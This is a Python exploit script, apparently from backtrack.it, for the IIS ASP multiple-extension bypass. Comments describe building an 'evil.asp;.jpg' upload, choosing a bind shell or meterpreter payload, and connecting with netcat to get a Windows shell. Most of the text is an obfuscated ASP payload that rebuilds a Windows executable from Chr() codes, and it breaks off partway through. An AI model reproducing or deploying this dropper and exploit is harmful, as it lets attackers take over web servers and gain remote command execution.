# By Emanuele Gentili and Emanuele Acri (http://backtrack.it)
# 
# usage:
#         ./IIS-asp.py <image.jpg> <shellcode number>
# shellcodes:
#         0 - shell_bind_tcp
#         1 - meterpreter_bind_tcp
#         2 - vncinject_bind_tcp
# root@enJoy:/tmp# ./IIS-asp.py image.jpg 0
# Exploit for Microsoft IIS ASP Multiple Extensions Security Bypass 5.x/6.x
# By Emanuele Gentili and Emanuele Acri (http://backtrack.it)
#
# [+] File evil.asp;.jpg created and ready to use.
# Enjoy... ;)
# root@enJoy:/tmp#
#
# .. Uploding evil.asp;.jpg on form and surfing the picture with browser for start payload ...
#
#
# root@enJoy:/tmp# nc -vv 10.12.6.6 31337
# Zerbion [10.12.6.6] 31337 (?) open
#
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
# c:\windows\system32\inetsrv>whoami
#
# nt authority\network service
#
# c:\windows\system32\inetsrv>

import sys

# Payloads

shell_bind_tcp       = """
<%
Sub NrMYDilU()
gfoN=Chr(77)&Chr(90)&Chr(144)&Chr(0)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(224)&Chr(0)&Chr(0)&Chr(0)&Chr(14)&Chr(31)&Chr(186)&Chr(14)&Chr(0)&Chr(180)&Chr(9)&Chr(205)&Chr(33)&Chr(184)&Chr(1)&Chr(76)&Chr(205)&Chr(33)&Chr(84)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(112)&Chr(114)&Chr(111)&Chr(103)&Chr(114)&Chr(97)&Chr(109)&Chr(32)&Chr(99)&Chr(97)&Chr(110)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(98)&Chr(101)
gfoN=gfoN&Chr(32)&Chr(114)&Chr(117)&Chr(110)&Chr(32)&Chr(105)&Chr(110)&Chr(32)&Chr(68)&Chr(79)&Chr(83)&Chr(32)&Chr(109)&Chr(111)&Chr(100)&Chr(101)&Chr(46)&Chr(13)&Chr(13)&Chr(10)&Chr(36)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(154)&Chr(70)&Chr(50)&Chr(175)&Chr(251)&Chr(40)&Chr(97)&Chr(175)&Chr(251)&Chr(40)&Chr(97)&Chr(175)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(172)&Chr(97)&Chr(181)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(189)&Chr(97)&Chr(191)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(171)&Chr(97)&Chr(230)&Chr(251)&Chr(40)&Chr(97)&Chr(136)&Chr(61)&Chr(83)&Chr(97)&Chr(172)&Chr(251)&Chr(40)&Chr(97)&Chr(175)&Chr(251)&Chr(41)&Chr(97)&Chr(230)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(162)&Chr(97)&Chr(174)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(185)&Chr(97)&Chr(174)&Chr(251)&Chr(40)&Chr(97)
gfoN=gfoN&Chr(82)&Chr(105)&Chr(99)&Chr(104)&Chr(175)&Chr(251)&Chr(40)&Chr(97)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(69)&Chr(0)&Chr(0)&Chr(76)&Chr(1)&Chr(4)&Chr(0)&Chr(1)&Chr(253)&Chr(103)&Chr(74)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(224)&Chr(0)&Chr(3)&Chr(1)&Chr(11)&Chr(1)&Chr(9)&Chr(0)&Chr(0)&Chr(100)&Chr(0)&Chr(0)&Chr(0)&Chr(44)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(198)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(5)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(208)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(100)&Chr(149)&Chr(0)&Chr(0)&Chr(40)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(192)&Chr(0)&Chr(0)&Chr(180)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(146)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(232)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(46)&Chr(116)&Chr(101)&Chr(120)&Chr(116)&Chr(0)&Chr(0)&Chr(0)&Chr(36)&Chr(98)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(100)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(96)&Chr(46)&Chr(114)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(0)&Chr(0)&Chr(162)&Chr(26)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(28)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(64)&Chr(46)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(0)&Chr(0)&Chr(0)&Chr(252)&Chr(23)&Chr(0)&Chr(0)&Chr(0)&Chr(160)&Chr(0)&Chr(0)&Chr(0)&Chr(14)&Chr(0)&Chr(0)&Chr(0)&Chr(132)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(192)&Chr(46)&Chr(114)&Chr(115)&Chr(114)&Chr(99)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(180)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(146)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(194)&Chr(16)&Chr(0)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(61)&Chr(104)&Chr(172)&Chr(64)&Chr(0)&Chr(1)&Chr(117)&Chr(5)&Chr(232)&Chr(209)&Chr(6)&Chr(0)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(30)&Chr(5)&Chr(0)&Chr(0)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(96)&Chr(2)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(93)&Chr(195)&Chr(106)&Chr(88)&Chr(104)&Chr(208)&Chr(146)&Chr(64)&Chr(0)&Chr(232)&Chr(128)&Chr(21)&Chr(0)&Chr(0)&Chr(51)&Chr(246)&Chr(137)&Chr(117)&Chr(252)&Chr(141)&Chr(69)&Chr(152)&Chr(80)&Chr(255)&Chr(21)&Chr(4)&Chr(128)&Chr(64)&Chr(0)&Chr(106)&Chr(254)&Chr(95)&Chr(137)&Chr(125)
gfoN=gfoN&Chr(252)&Chr(184)&Chr(77)&Chr(90)&Chr(0)&Chr(0)&Chr(102)&Chr(57)&Chr(5)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(117)&Chr(56)&Chr(161)&Chr(60)&Chr(0)&Chr(64)&Chr(0)&Chr(129)&Chr(184)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(80)&Chr(69)&Chr(0)&Chr(0)&Chr(117)&Chr(39)&Chr(185)&Chr(11)&Chr(1)&Chr(0)&Chr(0)&Chr(102)&Chr(57)&Chr(136)&Chr(24)&Chr(0)&Chr(64)&Chr(0)&Chr(117)&Chr(25)&Chr(131)&Chr(184)&Chr(116)&Chr(0)&Chr(64)&Chr(0)&Chr(14)&Chr(118)&Chr(16)&Chr(51)&Chr(201)&Chr(57)&Chr(176)&Chr(232)&Chr(0)&Chr(64)&Chr(0)&Chr(15)&Chr(149)&Chr(193)&Chr(137)&Chr(77)&Chr(228)&Chr(235)&Chr(3)&Chr(137)&Chr(117)&Chr(228)&Chr(51)&Chr(219)&Chr(67)&Chr(83)&Chr(232)&Chr(232)&Chr(20)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(8)&Chr(106)&Chr(28)&Chr(232)&Chr(88)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(232)&Chr(73)&Chr(19)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(8)&Chr(106)&Chr(16)&Chr(232)&Chr(71)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(232)&Chr(220)&Chr(14)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(252)&Chr(232)&Chr(128)&Chr(12)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(125)&Chr(8)&Chr(106)&Chr(27)&Chr(232)&Chr(95)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(255)&Chr(21)&Chr(0)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(248)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(45)&Chr(11)&Chr(0)&Chr(0)&Chr(163)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(232)&Chr(104)&Chr(10)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(125)&Chr(8)&Chr(106)&Chr(8)&Chr(232)&Chr(57)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(232)&Chr(223)&Chr(7)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(125)&Chr(8)&Chr(106)&Chr(9)&Chr(232)&Chr(40)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(83)&Chr(232)&Chr(224)&Chr(1)&Chr(0)&Chr(0)&Chr(89)
gfoN=gfoN&Chr(59)&Chr(198)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(22)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(232)&Chr(93)&Chr(7)&Chr(0)&Chr(0)&Chr(132)&Chr(93)&Chr(196)&Chr(116)&Chr(6)&Chr(15)&Chr(183)&Chr(77)&Chr(200)&Chr(235)&Chr(3)&Chr(106)&Chr(10)&Chr(89)&Chr(81)&Chr(80)&Chr(86)&Chr(104)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(232)&Chr(193)&Chr(254)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(224)&Chr(57)&Chr(117)&Chr(228)&Chr(117)&Chr(6)&Chr(80)&Chr(232)&Chr(87)&Chr(3)&Chr(0)&Chr(0)&Chr(232)&Chr(126)&Chr(3)&Chr(0)&Chr(0)&Chr(137)&Chr(125)&Chr(252)&Chr(235)&Chr(53)&Chr(139)&Chr(69)&Chr(236)&Chr(139)&Chr(8)&Chr(139)&Chr(9)&Chr(137)&Chr(77)&Chr(220)&Chr(80)&Chr(81)&Chr(232)&Chr(185)&Chr(5)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(139)&Chr(69)&Chr(220)&Chr(137)&Chr(69)&Chr(224)&Chr(131)&Chr(125)&Chr(228)&Chr(0)
gfoN=gfoN&Chr(117)&Chr(6)&Chr(80)&Chr(232)&Chr(58)&Chr(3)&Chr(0)&Chr(0)&Chr(232)&Chr(90)&Chr(3)&Chr(0)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(224)&Chr(235)&Chr(19)&Chr(51)&Chr(192)&Chr(64)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(184)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(84)&Chr(20)&Chr(0)&Chr(0)&Chr(195)&Chr(232)&Chr(253)&Chr(21)&Chr(0)&Chr(0)&Chr(233)&Chr(120)&Chr(254)&Chr(255)&Chr(255)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(0)&Chr(129)&Chr(56)&Chr(99)&Chr(115)&Chr(109)&Chr(224)&Chr(117)&Chr(42)&Chr(131)&Chr(120)&Chr(16)&Chr(3)&Chr(117)&Chr(36)&Chr(139)&Chr(64)&Chr(20)&Chr(61)&Chr(32)&Chr(13)&Chr(147)&Chr(25)&Chr(116)&Chr(21)&Chr(61)&Chr(33)&Chr(5)&Chr(147)&Chr(25)&Chr(116)
gfoN=gfoN&Chr(14)&Chr(61)&Chr(34)&Chr(5)&Chr(147)&Chr(25)&Chr(116)&Chr(7)&Chr(61)&Chr(0)&Chr(64)&Chr(153)&Chr(1)&Chr(117)&Chr(5)&Chr(232)&Chr(82)&Chr(22)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(93)&Chr(194)&Chr(4)&Chr(0)&Chr(104)&Chr(180)&Chr(17)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(8)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(87)&Chr(191)&Chr(232)&Chr(3)&Chr(0)&Chr(0)&Chr(87)&Chr(255)&Chr(21)&Chr(16)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(129)&Chr(199)&Chr(232)&Chr(3)&Chr(0)&Chr(0)&Chr(129)&Chr(255)&Chr(96)&Chr(234)&Chr(0)&Chr(0)&Chr(119)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(222)&Chr(95)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(232)&Chr(169)&Chr(4)&Chr(0)&Chr(0)&Chr(177)&Chr(117)
gfoN=gfoN&Chr(8)&Chr(232)&Chr(246)&Chr(2)&Chr(0)&Chr(0)&Chr(255)&Chr(53)&Chr(4)&Chr(160)&Chr(64)&Chr(0)&Chr(232)&Chr(20)&Chr(14)&Chr(0)&Chr(0)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(208)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(104)&Chr(40)&Chr(129)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(21)&Chr(104)&Chr(24)&Chr(129)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(208)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(200)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(24)&Chr(128)&Chr(64)&Chr(0)&Chr(204)&Chr(106)&Chr(8)&Chr(232)&Chr(97)
gfoN=gfoN&Chr(23)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(106)&Chr(8)&Chr(232)&Chr(126)&Chr(22)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(240)&Chr(235)&Chr(11)&Chr(139)&Chr(6)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(255)&Chr(208)&Chr(131)&Chr(198)&Chr(4)&Chr(59)&Chr(117)&Chr(8)&Chr(114)&Chr(240)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(51)&Chr(192)&Chr(235)&Chr(15)&Chr(133)&Chr(192)&Chr(117)&Chr(16)&Chr(139)&Chr(14)&Chr(133)&Chr(201)&Chr(116)&Chr(2)&Chr(255)&Chr(209)&Chr(131)&Chr(198)&Chr(4)&Chr(59)&Chr(117)&Chr(12)&Chr(114)&Chr(236)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(61)&Chr(240)&Chr(183)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(25)&Chr(104)&Chr(240)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(213)
gfoN=gfoN&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(10)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(240)&Chr(183)&Chr(64)&Chr(0)&Chr(89)&Chr(232)&Chr(12)&Chr(26)&Chr(0)&Chr(0)&Chr(104)&Chr(4)&Chr(129)&Chr(64)&Chr(0)&Chr(104)&Chr(240)&Chr(128)&Chr(64)&Chr(0)&Chr(232)&Chr(161)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(66)&Chr(104)&Chr(196)&Chr(31)&Chr(64)&Chr(0)&Chr(232)&Chr(214)&Chr(25)&Chr(0)&Chr(0)&Chr(184)&Chr(232)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(4)&Chr(36)&Chr(236)&Chr(128)&Chr(64)&Chr(0)&Chr(232)&Chr(99)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(61)&Chr(244)&Chr(183)&Chr(64)&Chr(0)&Chr(0)&Chr(89)&Chr(116)&Chr(27)&Chr(104)&Chr(244)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(125)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(12)&Chr(106)&Chr(0)&Chr(106)&Chr(2)
gfoN=gfoN&Chr(106)&Chr(0)&Chr(255)&Chr(21)&Chr(244)&Chr(183)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(106)&Chr(24)&Chr(104)&Chr(248)&Chr(146)&Chr(64)&Chr(0)&Chr(232)&Chr(52)&Chr(18)&Chr(0)&Chr(0)&Chr(106)&Chr(8)&Chr(232)&Chr(125)&Chr(22)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(51)&Chr(219)&Chr(67)&Chr(57)&Chr(29)&Chr(156)&Chr(172)&Chr(64)&Chr(0)&Chr(15)&Chr(132)&Chr(197)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(29)&Chr(152)&Chr(172)&Chr(64)&Chr(0)&Chr(138)&Chr(69)&Chr(16)&Chr(162)&Chr(148)&Chr(172)&Chr(64)&Chr(0)&Chr(131)&Chr(125)&Chr(12)&Chr(0)&Chr(15)&Chr(133)&Chr(157)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(53)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(163)&Chr(12)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(248)&Chr(137)&Chr(125)&Chr(216)&Chr(133)&Chr(255)&Chr(116)&Chr(120)&Chr(255)&Chr(53)&Chr(228)&Chr(183)
